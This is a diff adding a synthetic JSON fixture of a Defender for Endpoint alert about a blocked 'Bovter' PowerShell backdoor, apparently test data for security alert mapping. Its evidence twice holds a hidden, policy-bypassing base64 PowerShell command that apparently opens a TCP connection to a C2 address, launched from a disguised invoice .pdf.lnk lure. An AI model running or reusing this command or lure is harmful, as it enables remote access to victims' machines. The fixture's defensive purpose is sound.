@@ -1,0 +1,310 @@
+{
+    "finding_info": {
+        "uid": "placeholder_uid",
+        "title": "Defender for Endpoint - Suspicious 'Bovter' backdoor was prevented",
+        "desc": "Malicious activity matching the PowerShell-based Bovter backdoor family was detected by Microsoft Defender Antivirus on ws-fin-042.contoso.corp. A malicious LNK shortcut spawned cmd.exe which launched powershell.exe with an obfuscated, base64-encoded command line. The script attempted to establish a reverse TCP connection to a known command-and-control server (195.201.59.127:4443). AMSI detected the script content and the AV engine quarantined the process. MITRE ATT&CK: T1059.001 (PowerShell), T1027 (Obfuscated Files or Information), T1140 (Deobfuscate/Decode Files or Information).",
+        "src_url": "https://security.microsoft.com/alerts/be8e7d6c-5f4a-3b2c-1d0e-9f8a7b6c5d4e",
+        "related_events": [
+            {
+                "uid": "ws-fin-042.contoso.corp (1f2e3d4c-5b6a-7980-1a2b-3c4d5e6f7081): malicious",
+                "message": "ws-fin-042.contoso.corp (1f2e3d4c-5b6a-7980-1a2b-3c4d5e6f7081): malicious"
+            },
+            {
+                "uid": "47f8a3c2e9b14d6580f1ce7a9b3d2e5814f7c0a2 (mdeDeviceId): malicious",
+                "message": "processEvidence on mdeDeviceId 47f8a3c2e9b14d6580f1ce7a9b3d2e5814f7c0a2: malicious"
+            },
+            {
+                "uid": "47f8a3c2e9b14d6580f1ce7a9b3d2e5814f7c0a2 (mdeDeviceId): malicious",
+                "message": "fileEvidence Invoice_INV-2026-04827.pdf.lnk on 47f8a3c2e9b14d6580f1ce7a9b3d2e5814f7c0a2: malicious"
+            },
+            {
+                "uid": "contoso (a8f3b1d2-7e4c-49a0-b5d8-2c3e4f5a6b71): suspicious",
+                "message": "userEvidence alex.morgan@contoso.com: suspicious"
+            }
+        ]
+    },
+    "resources": [
+        {
+            "uid": "DYNAMIC_RESOURCE_UID",
+            "name": "ws-fin-042.contoso.corp",
+            "type": "Windows11",
+            "version": "10.0.22631.3737",
+            "owner": {
+                "email_addr": "alex.morgan"
+            }
+        }
+    ],
+    "observables": [
+        {
+            "name": "azureAdDeviceId",
+            "type": "Resource UID",
+            "type_id": 10,
+            "value": "1f2e3d4c-5b6a-7980-1a2b-3c4d5e6f7081"
+        },
+        {
+            "name": "ipInterfaces",
+            "type": "IP Address",
+            "type_id": 2,
+            "value": "10.84.17.42"
+        },
+        {
+            "name": "osPlatform",
+            "type": "Endpoint",
+            "type_id": 20,
+            "value": "Windows11"
+        },
+        {
+            "name": "loggedOnUsers",
+            "type": "User",
+            "type_id": 21,
+            "value": "alex.morgan"
+        },
+        {
+            "name": "mdeDeviceId",
+            "type": "Resource UID",
+            "type_id": 10,
+            "value": "47f8a3c2e9b14d6580f1ce7a9b3d2e5814f7c0a2"
+        },
+        {
+            "name": "processId",
+            "type": "Process",
+            "type_id": 25,
+            "value": "10284"
+        }
+    ],
+    "evidences": [
+        {
+            "process": {
+                "cmd_line": "powershell.exe -nop -w hidden -ep bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADUALgAyADAAMQAuADUAOQAuADEAMgA3ACIALAA0ADQA0ADMAKQA=",
+                "parent_process": {
+                    "name": "explorer.exe"
+                },
+                "user": {
+                    "name": "alex.morgan@contoso.com"
+                },
+                "file": {
+                    "name": "stager.ps1",
+                    "path": "C:\\Users\\alex.morgan\\AppData\\Local\\Temp\\stager.ps1",
+                    "size": 4096,
+                    "hashes": [
+                        {
+                            "algorithm_id": 2,
+                            "algorithm": "SHA-1",
+                            "value": "f9e8d7c6b5a4938271605f4e3d2c1b0a98876543"
+                        },
+                        {
+                            "algorithm_id": 3,
+                            "algorithm": "SHA-256",
+                            "value": "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b"
+                        }
+                    ]
+                }
+            }
+        }
+    ],
+    "severity": "high",
+    "severity_id": 4,
+    "activity_id": 1,
+    "category_uid": 2,
+    "category_name": "Findings",
+    "class_uid": 99602001,
+    "class_name": "S1 Security Alert",
+    "type_uid": 9960200101,
+    "type_name": "S1 Security Alert: Create",
+    "attack_surface_ids": [
+        1
+    ],
+    "s1_classification_id": 28,
+    "dataSource": {
+        "name": "Microsoft O365",
+        "category": "security",
+        "vendor": "Microsoft"
+    },
+    "cloud": {
+        "provider": "Microsoft Azure"
+    },
+    "metadata": {
+        "version": "1.1.0",
+        "product": {
+            "name": "Microsoft Defender for Endpoint",
+            "vendor_name": "Microsoft"
+        },
+        "logged_time": "DYNAMIC",
+        "modified_time": "DYNAMIC",
+        "extension": {
+            "name": "s1",
+            "uid": "998",
+            "version": "0.1.0"
+        }
+    },
+    "time": "DYNAMIC",
+    "raw_data": "DYNAMIC",
+    "additional_data": {
+        "graph_alert": {
+            "@odata.type": "#microsoft.graph.security.alert",
+            "id": "be8e7d6c-5f4a-3b2c-1d0e-9f8a7b6c5d4e",
+            "providerAlertId": "da637551227677560813_-961444813",
+            "incidentId": "28293",
+            "incidentWebUrl": "https://security.microsoft.com/incidents2/28293",
+            "alertWebUrl": "https://security.microsoft.com/alerts/be8e7d6c-5f4a-3b2c-1d0e-9f8a7b6c5d4e",
+            "title": "Suspicious 'Bovter' backdoor was prevented",
+            "description": "Malicious activity matching the PowerShell-based Bovter backdoor family was detected by Microsoft Defender Antivirus. A malicious LNK shortcut spawned cmd.exe which launched powershell.exe with an obfuscated command line attempting to connect to known C2 infrastructure.",
+            "category": "Execution",
+            "severity": "high",
+            "status": "new",
+            "classification": "unknown",
+            "determination": "unknown",
+            "serviceSource": "microsoftDefenderForEndpoint",
+            "detectionSource": "antivirus",
+            "detectorId": "e0da400f-affd-43ef-b1d4-afa2bb96ff05",
+            "productName": "Microsoft Defender for Endpoint",
+            "tenantId": "b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c",
+            "actorDisplayName": null,
+            "threatDisplayName": "Backdoor:PowerShell/Bovter.A",
+            "threatFamilyName": "Bovter",
+            "mitreTechniques": [
+                "T1059.001",
+                "T1027",
+                "T1140"
+            ],
+            "systemTags": [
+                "AMSI",
+                "AutoIR"
+            ],
+            "comments": [],
+            "createdDateTime": "DYNAMIC",
+            "lastUpdateDateTime": "DYNAMIC",
+            "resolvedDateTime": null,
+            "firstActivityDateTime": "DYNAMIC",
+            "lastActivityDateTime": "DYNAMIC",
+            "additionalData": {
+                "ThreatId": "2147736291",
+                "EngineVersion": "1.1.24050.5",
+                "SignatureVersion": "1.413.847.0",
+                "WasExecutingWhileDetected": true,
+                "RemediationAction": "Quarantine"
+            },
+            "recommendedActions": "1. Isolate the device from the network. 2. Reset the user's password and revoke all sessions. 3. Run a full antivirus scan. 4. Review process tree and remediate any persistence mechanisms.",
+            "evidence": [
+                {
+                    "@odata.type": "#microsoft.graph.security.deviceEvidence",
+                    "createdDateTime": "DYNAMIC",
+                    "verdict": "malicious",
+                    "remediationStatus": "none",
+                    "roles": [
+                        "compromised"
+                    ],
+                    "detailedRoles": [],
+                    "tags": [],
+                    "mdeDeviceId": "47f8a3c2e9b14d6580f1ce7a9b3d2e5814f7c0a2",
+                    "azureAdDeviceId": "1f2e3d4c-5b6a-7980-1a2b-3c4d5e6f7081",
+                    "deviceDnsName": "ws-fin-042.contoso.corp",
+                    "osPlatform": "Windows11",
+                    "osBuild": 22631,
+                    "version": "10.0.22631.3737",
+                    "healthStatus": "active",
+                    "riskScore": "high",
+                    "rbacGroupId": 42,
+                    "rbacGroupName": "Finance Endpoints",
+                    "onboardingStatus": "onboarded",
+                    "defenderAvStatus": "updated",
+                    "ipInterfaces": [
+                        "10.84.17.42"
+                    ],
+                    "vmMetadata": null,
+                    "loggedOnUsers": [
+                        {
+                            "accountName": "alex.morgan",
+                            "domainName": "contoso"
+                        }
+                    ]
+                },
+                {
+                    "@odata.type": "#microsoft.graph.security.userEvidence",
+                    "createdDateTime": "DYNAMIC",
+                    "verdict": "suspicious",
+                    "remediationStatus": "none",
+                    "roles": [
+                        "compromised"
+                    ],
+                    "detailedRoles": [],
+                    "tags": [],
+                    "userAccount": {
+                        "accountName": "alex.morgan",
+                        "domainName": "contoso",
+                        "userPrincipalName": "alex.morgan@contoso.com",
+                        "userSid": "S-1-5-21-1004336348-1177238915-682003330-1284",
+                        "azureAdUserId": "a8f3b1d2-7e4c-49a0-b5d8-2c3e4f5a6b71"
+                    },
+                    "stream": null
+                },
+                {
+                    "@odata.type": "#microsoft.graph.security.processEvidence",
+                    "createdDateTime": "DYNAMIC",
+                    "verdict": "malicious",
+                    "remediationStatus": "remediated",
+                    "remediationStatusDetails": "Process terminated and file quarantined",
+                    "roles": [
+                        "compromised"
+                    ],
+                    "detailedRoles": [],
+                    "tags": [],
+                    "mdeDeviceId": "47f8a3c2e9b14d6580f1ce7a9b3d2e5814f7c0a2",
+                    "processId": 10284,
+                    "parentProcessId": 9847,
+                    "processCommandLine": "powershell.exe -nop -w hidden -ep bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADUALgAyADAAMQAuADUAOQAuADEAMgA3ACIALAA0ADQA0ADMAKQA=",
+                    "processCreationDateTime": "DYNAMIC",
+                    "parentProcessCreationDateTime": "DYNAMIC",
+                    "detectionStatus": "detected",
+                    "imageFile": {
+                        "sha1": "3f0d8e7c6b5a4938271605f4e3d2c1b0a9887654",
+                        "sha256": "9f8e7d6c5b4a3928171605f4e3d2c1b0a98876541a2b3c4d5e6f7a8b9c0d1e2f",
+                        "fileName": "powershell.exe",
+                        "filePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+                        "fileSize": 452608,
+                        "filePublisher": "Microsoft Corporation",
+                        "signer": "Microsoft Windows",
+                        "issuer": "Microsoft Windows Production PCA 2011"
+                    },
+                    "parentProcessImageFile": {
+                        "fileName": "explorer.exe",
+                        "filePath": "C:\\Windows",
+                        "sha1": "2e1f0b3c4d5e6789abcdef0123456789abcdef01"
+                    },
+                    "userAccount": {
+                        "accountName": "alex.morgan",
+                        "domainName": "contoso",
+                        "userPrincipalName": "alex.morgan@contoso.com",
+                        "userSid": "S-1-5-21-1004336348-1177238915-682003330-1284",
+                        "azureAdUserId": "a8f3b1d2-7e4c-49a0-b5d8-2c3e4f5a6b71"
+                    }
+                },
+                {
+                    "@odata.type": "#microsoft.graph.security.fileEvidence",
+                    "createdDateTime": "DYNAMIC",
+                    "verdict": "malicious",
+                    "remediationStatus": "remediated",
+                    "remediationStatusDetails": "File quarantined",
+                    "roles": [
+                        "compromised"
+                    ],
+                    "detailedRoles": [],
+                    "tags": [],
+                    "mdeDeviceId": "47f8a3c2e9b14d6580f1ce7a9b3d2e5814f7c0a2",
+                    "detectionStatus": "detected",
+                    "fileDetails": {
+                        "sha1": "f9e8d7c6b5a4938271605f4e3d2c1b0a98876543",
+                        "sha256": "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
+                        "fileName": "Invoice_INV-2026-04827.pdf.lnk",
+                        "filePath": "C:\\Users\\alex.morgan\\Downloads\\invoice-04827",
+                        "fileSize": 1842,
+                        "filePublisher": null,
+                        "signer": null,
+                        "issuer": null
+                    }
+                }
+            ]
+        }
+    },
+    "state_id": 1
+}
